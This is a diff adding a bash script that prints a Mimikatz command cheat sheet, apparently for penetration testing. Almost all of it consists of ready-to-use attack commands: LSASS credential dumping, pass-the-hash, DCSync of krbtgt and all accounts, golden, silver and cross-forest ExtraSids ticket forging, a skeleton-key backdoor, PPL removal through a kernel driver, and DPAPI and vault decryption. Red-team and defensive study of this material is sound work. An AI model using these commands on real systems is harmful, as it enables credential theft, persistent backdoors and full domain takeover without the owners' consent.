@@ -1,0 +1,77 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── MIMIKATZ — COMMAND REFERENCE ─────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Always Run First ─────────────────────────────────${NC}"
+echo -e "  ${GREEN}privilege::debug${NC}              # must succeed before anything else"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── sekurlsa — LSASS Credential Dump ─────────────────${NC}"
+echo -e "  ${GREEN}sekurlsa::logonpasswords${NC}      # NTLM + cleartext (wdigest) + Kerberos"
+echo -e "  ${GREEN}sekurlsa::ekeys${NC}               # AES128/256 Kerberos session keys"
+echo -e "  ${GREEN}sekurlsa::tickets /export${NC}     # dump all TGT/TGS to .kirbi files"
+echo -e "  ${GREEN}sekurlsa::dpapi${NC}               # DPAPI master keys from LSASS"
+echo -e "  ${GREEN}sekurlsa::minidump lsass.dmp${NC}  # parse offline dump (run before logonpasswords)"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Pass-the-Hash — sekurlsa::pth ────────────────────${NC}"
+echo -e "  ${GREEN}sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM> /run:\"cmd.exe\"${NC}"
+echo -e "  ${GREEN}sekurlsa::pth /user:admin /domain:corp1 /ntlm:<HASH> /run:\"mstsc.exe /restrictedadmin\"${NC}"
+echo -e "  ${GREEN}sekurlsa::pth /user:user /domain:corp /aes256:<AES256KEY> /run:powershell.exe${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── lsadump — Registry & AD Secrets ─────────────────${NC}"
+echo -e "  ${GREEN}lsadump::sam${NC}                  # local SAM (local hashes)"
+echo -e "  ${GREEN}lsadump::secrets${NC}              # LSA secrets (service account creds)"
+echo -e "  ${GREEN}lsadump::dcsync /domain:corp.local /user:corp\\krbtgt${NC}  # DCSync (single user)"
+echo -e "  ${GREEN}lsadump::dcsync /domain:corp.local /all /csv${NC}           # DCSync (all)"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Offline SAM Parsing ──────────────────────────────${NC}"
+echo -e "  ${GREEN}lsadump::sam /system:C:\\Temp\\system /sam:C:\\Temp\\sam${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Kerberos — Golden / Silver / PTT ─────────────────${NC}"
+echo -e "  ${GREEN}kerberos::ptt ticket.kirbi${NC}    # inject .kirbi ticket into session"
+echo -e "  ${GREEN}kerberos::list${NC}                # list Kerberos tickets in memory"
+echo -e "  ${GREEN}kerberos::purge${NC}               # clear all tickets"
+printf "\n"
+echo -e "  Note: Golden Ticket:"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt${NC}"
+printf "\n"
+echo -e "  Note: Silver Ticket:"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:corp.com /sid:<DOMAIN_SID> /rc4:<SVC_HASH> /target:srv01 /service:cifs /ptt${NC}"
+printf "\n"
+echo -e "  Note: Cross-domain ExtraSids - child -> forest root:"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:child.corp.com /sid:<CHILD_SID> /krbtgt:<CHILD_KRBTGT> /sids:<ROOT_SID>-519 /ptt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── token / vault / misc ─────────────────────────────${NC}"
+echo -e "  ${GREEN}token::elevate${NC}                # impersonate SYSTEM from current process"
+echo -e "  ${GREEN}token::list${NC}                   # list available tokens"
+echo -e "  ${GREEN}vault::list${NC}                   # list Credential Manager entries"
+echo -e "  ${GREEN}vault::cred /patch${NC}            # decrypt vault credentials"
+echo -e "  ${GREEN}misc::skeleton${NC}                # skeleton key — all accounts accept 'mimikatz'"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PPL Bypass (lsass protected) ─────────────────────${NC}"
+echo -e "  ${GREEN}!+${NC}                            # load mimidrv.sys kernel driver"
+echo -e "  ${GREEN}!processprotect /process:lsass.exe /remove${NC}  # strip PPL"
+echo -e "  ${GREEN}sekurlsa::logonpasswords${NC}      # now works"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── DPAPI ────────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\<BLOB>${NC}"
+echo -e "  ${GREEN}dpapi::cred /in:<BLOB> /masterkey:<HEX_KEY>${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
